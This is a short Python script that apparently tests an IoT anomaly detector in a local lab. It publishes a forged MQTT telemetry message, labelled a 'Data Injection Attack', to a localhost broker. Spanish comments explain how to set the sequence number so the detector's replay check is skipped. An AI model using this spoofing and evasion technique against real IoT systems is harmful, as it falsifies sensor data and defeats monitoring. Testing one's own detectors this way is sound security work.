import paho.mqtt.client as mqtt
import json

BROKER = "localhost"
TOPIC = "device_1/telemetry"

client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
client.connect(BROKER, 1883)

print("💉 Starting Data Injection Attack (Targeting AI Model)...")

# Para que NO lo detecte como Replay, usa una secuencia que NO sea 999 
# (usa un número que sea el siguiente al último que enviaste, ej: -1 para ignorar o un num bajo)
fake_data = {
    "temperature": 150.0, 
    "humidity": 5.0,
    "seq": 0,    # Al poner 0, el detector suele resetear o ignorar el chequeo de Replay según tu lógica
    "state": 8   
}

client.publish(TOPIC, json.dumps(fake_data))
print(f"🚀 Sent malicious payload: {fake_data}")
client.disconnect()